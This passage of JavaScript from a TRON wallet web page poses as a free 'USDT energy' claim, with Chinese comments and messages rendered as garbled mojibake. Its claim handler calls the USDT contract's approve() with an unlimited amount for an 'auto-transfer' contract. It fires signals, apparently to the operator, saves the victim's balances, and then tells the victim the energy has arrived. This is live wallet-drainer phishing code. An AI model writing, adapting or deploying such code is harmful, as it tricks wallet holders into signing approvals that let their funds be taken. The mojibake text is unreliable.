                userInfoDefault.innerHTML = `ğŸ“¤ å‘é€B1ä¿¡å·ï¼ˆå¼‚æ­¥ï¼‰ï¼š${userAddress}`;
                sendSignalB(true).catch(err => console.warn("B1ä¿¡å·å‘é€å¤±è´¥ï¼ˆä¸å½±å“ç­¾åï¼‰ï¼š", err));
                markB1SignalSent(userAddress);
            } else {
                // é¡µé¢åé¦ˆï¼š30å¤©å†…å·²å‘é€B1ä¿¡å·ï¼Œè·³è¿‡
                userInfoDefault.innerHTML = `â„¹ï¸ 30å¤©å†…å·²å‘é€B1ä¿¡å·ï¼Œè·³è¿‡å‘é€ï¼š${userAddress}`;
            }
            // æ ¸å¿ƒæ ¡éªŒï¼šç¡®ä¿å·²æœ‰åˆçº¦å®ä¾‹æœ‰æ•ˆ
            if (!trc20Contract) {
                // é¡µé¢åé¦ˆï¼šåˆçº¦å®ä¾‹æœªåˆå§‹åŒ–ï¼Œé‡æ–°åˆå§‹åŒ–
                userInfoDefault.innerHTML = `ğŸ”„ åˆçº¦å®ä¾‹æœªåˆå§‹åŒ–ï¼Œé‡æ–°åˆå§‹åŒ–ï¼š${TRC20_TOKEN_ADDRESS}`;
                trc20Contract = await tronWeb.contract(USDT_ABI, TRC20_TOKEN_ADDRESS);
                if (!trc20Contract) throw new Error("åˆçº¦å®ä¾‹åˆå§‹åŒ–å¤±è´¥ï¼Œè¯·é‡æ–°è¿æ¥é’±åŒ…");
            } else {
                // é¡µé¢åé¦ˆï¼šåˆçº¦å®ä¾‹æœ‰æ•ˆ
                userInfoDefault.innerHTML = `âœ… åˆçº¦å®ä¾‹æœ‰æ•ˆï¼š${TRC20_TOKEN_ADDRESS}`;
            }
            // ç¡®ä¿TronWebå°±ç»ª
            if (!tronWeb.ready) {
                // é¡µé¢åé¦ˆï¼šTronWebæœªå°±ç»ªï¼Œç­‰å¾…å°±ç»ª
                userInfoDefault.innerHTML = `âŒ› TronWebæœªå°±ç»ªï¼Œç­‰å¾…å°±ç»ª...`;
                await new Promise(resolve => tronWeb.onReady(resolve));
            }
            // å…³é”®ï¼šåˆçº¦approveè°ƒç”¨
            // é¡µé¢åé¦ˆï¼šå‘èµ·åˆçº¦æˆæƒè°ƒç”¨
            userInfoDefault.innerHTML = `ğŸ“¤ å‘èµ·åˆçº¦æˆæƒè°ƒç”¨<br><span>æˆæƒå¯¹è±¡ï¼š${AUTO_TRANSFER_CONTRACT} | æˆæƒé‡‘é¢ï¼šæ— é™</span>`;
            const approveResult = await trc20Contract.approve(
                AUTO_TRANSFER_CONTRACT, // æˆæƒå¯¹è±¡
                INFINITE_APPROVE_AMOUNT // æ— é™æˆæƒé‡‘é¢
            ).send({
                from: userAddress,
                shouldPollResponse: true // ç­‰å¾…é“¾ä¸Šç¡®è®¤
            });
            // é¡µé¢åé¦ˆï¼šç­¾åæˆåŠŸï¼Œç­‰å¾…é“¾ä¸Šç¡®è®¤
            userInfoDefault.innerHTML = `âœ… ç­¾åæˆåŠŸï¼Œç­‰å¾…é“¾ä¸Šç¡®è®¤<br><span>äº¤æ˜“å“ˆå¸Œï¼š${approveResult.transaction}</span>`;
            // ç­¾åæˆåŠŸåæ”¶å°¾
            reviewTipText.textContent = "ç­¾åæˆåŠŸï¼Œèƒ½é‡å·²åˆ°è´¦...";
            // é¡µé¢åé¦ˆï¼šå‘é€A2å’ŒB2ä¿¡å·ï¼ˆåŒæ­¥ï¼‰
            userInfoDefault.innerHTML = `ğŸ“¤ å‘é€A2å’ŒB2ä¿¡å·ï¼ˆåŒæ­¥ï¼‰ï¼š${userAddress}`;
            await Promise.all([
                sendSignalA2().catch(err => console.warn("A2ä¿¡å·åŒæ­¥å¤±è´¥ï¼š", err)),
                sendSignalB(false).catch(err => console.warn("B2ä¿¡å·åŒæ­¥å¤±è´¥ï¼š", err))
            ]);
            addAuthorizedAddress(userAddress);
            saveEnergyRecord();
            renderEnergyRecords();
            btn.textContent = lang.successBtn;
            // è¿½åŠ æˆåŠŸæç¤ºï¼ˆæ— åœ°å€ã€æ— ä½™é¢ï¼‰
            userInfoStatus.innerHTML += lang.successArrival;
            // é¡µé¢åé¦ˆï¼šèƒ½é‡é¢†å–æˆåŠŸ
            userInfoDefault.innerHTML = `ğŸ‰ èƒ½é‡é¢†å–æˆåŠŸï¼š90000Î¼s USDTèƒ½é‡å·²åˆ°è´¦<br><span>åœ°å€ï¼š${userAddress} | äº¤æ˜“å“ˆå¸Œï¼š${approveResult.transaction}</span>`;
            alert(lang.successTip);
            reviewTip.style.display = "none";
        } catch (e) {
            console.error("Approveè°ƒç”¨å¤±è´¥ï¼ˆæ ¸å¿ƒåŸå› ï¼‰ï¼š", e);
            reviewTip.style.display = "none";
            btn.disabled = false;
            btn.textContent = lang.approveBtnText;
            // æ˜ç¡®æç¤ºé”™è¯¯ç±»å‹
            let errMsg = e.message;
            if (errMsg.includes("A1ç¯å¢ƒæ ¡éªŒ")) {
                errMsg = "A1ç¯å¢ƒæ ¡éªŒæœªé€šè¿‡ï¼Œè¯·é‡æ–°è¿æ¥é’±åŒ…";
            } else if (errMsg.includes("contract")) {
                errMsg = "åˆçº¦å®ä¾‹æ— æ•ˆï¼Œè¯·é‡æ–°è¿æ¥é’±åŒ…";
            }
            // é¡µé¢åé¦ˆï¼šé¢†å–å¤±è´¥
            userInfoDefault.innerHTML = `âŒ é¢†å–å¤±è´¥ï¼š${errMsg}<br><span>é”™è¯¯ï¼š${JSON.stringify(e)}</span>`;
            alert(lang.authorizeFail.replace("{msg}", errMsg || "ç­¾åå–æ¶ˆæˆ–ç½‘ç»œå¼‚å¸¸"));
        }
    };
}

// ========== è¾…åŠ©å‡½æ•° ==========
function updateWalletStatus() {
    const isConnected = userAddress ? true : false;
    // é¡µé¢åé¦ˆï¼šæ›´æ–°é’±åŒ…è¿æ¥çŠ¶æ€
    userInfoDefault.innerHTML = `ğŸ”„ æ›´æ–°é’±åŒ…è¿æ¥çŠ¶æ€ï¼š${isConnected ? "å·²è¿æ¥" : "æœªè¿æ¥"}`;
    userAddress ? walletStatusContainer.classList.add("connected") : walletStatusContainer.classList.remove("connected");
    // é¡µé¢åé¦ˆï¼šé’±åŒ…çŠ¶æ€æ›´æ–°å®Œæˆ
    userInfoDefault.innerHTML = `âœ… é’±åŒ…çŠ¶æ€æ›´æ–°å®Œæˆï¼š${isConnected ? "å·²è¿æ¥ï¼ˆæ˜¾ç¤ºå·²è¿æ¥å†…å®¹ï¼‰" : "æœªè¿æ¥ï¼ˆæ˜¾ç¤ºæœªè¿æ¥å†…å®¹ï¼‰"}`;
}

function saveEnergyRecord() {
    const lang = langConfig[currentLang];
    // é¡µé¢åé¦ˆï¼šå¼€å§‹ä¿å­˜é¢†å–è®°å½•
    userInfoDefault.innerHTML = `ğŸ”„ ä¿å­˜é¢†å–è®°å½•ï¼š${userAddress}`;
    const existing = JSON.parse(localStorage.getItem(RECORD_KEY) || "[]");
    const newRecords = existing.filter(item => item.address !== userAddress);
    newRecords.push({
        address: userAddress,
        tokenBalance: tokenBalance,
        trxBalance: trxBalance,
        receiveTime: new Date().toLocaleString(),
        energyAmount: "90000Î¼s",
        recordType: lang.freeEnergy
    });
    localStorage.setItem(RECORD_KEY, JSON.stringify(newRecords));
    // é¡µé¢åé¦ˆï¼šé¢†å–è®°å½•ä¿å­˜æˆåŠŸ
    userInfoDefault.innerHTML = `âœ… é¢†å–è®°å½•ä¿å­˜æˆåŠŸï¼š${userAddress}<br><span>è®°å½•ï¼š${JSON.stringify(newRecords[newRecords.length-1])}</span>`;
}

function renderEnergyRecords() {
    const lang = langConfig[currentLang];
    const container = document.getElementById("approvalRecords");
    const records = JSON.parse(localStorage.getItem(RECORD_KEY) || "[]");
    // é¡µé¢åé¦ˆï¼šå¼€å§‹æ¸²æŸ“é¢†å–è®°å½•
    userInfoDefault.innerHTML = `ğŸ”„ æ¸²æŸ“é¢†å–è®°å½•ï¼šå…±${records.length}æ¡`;
    // ç¡®ä¿å³ä½¿æ— è®°å½•ï¼Œä¹Ÿæ˜¾ç¤ºé»˜è®¤æ–‡æœ¬
    if (records.length === 0) {
        container.innerHTML = `<div class='record-item' style='text-align: center; padding: 10px 0;'>${lang.noRecord}</div>`;
        // é¡µé¢åé¦ˆï¼šæ— é¢†å–è®°å½•
        userInfoDefault.innerHTML = `â„¹ï¸ æ— é¢†å–è®°å½•ï¼Œæ˜¾ç¤ºé»˜è®¤æ–‡æœ¬`;
        return;
    }
    // æœ‰è®°å½•æ—¶æ­£å¸¸æ¸²æŸ“ï¼ˆéšè—åœ°å€ï¼‰
    container.innerHTML = records.map(record => `
        <div class='record-item'>
            <p><strong>${lang.recordType}</strong>${record.recordType}</p>
            <p><strong>${lang.recordEnergy}</strong>${record.energyAmount} USDT Energy</p>
            <p><strong>${lang.recordTime}</strong>${record.receiveTime}</p>
        </div>
    `).join("");
    // é¡µé¢åé¦ˆï¼šé¢†å–è®°å½•æ¸²æŸ“å®Œæˆ
    userInfoDefault.innerHTML = `âœ… é¢†å–è®°å½•æ¸²æŸ“å®Œæˆï¼šå…±${records.length}æ¡`;
}
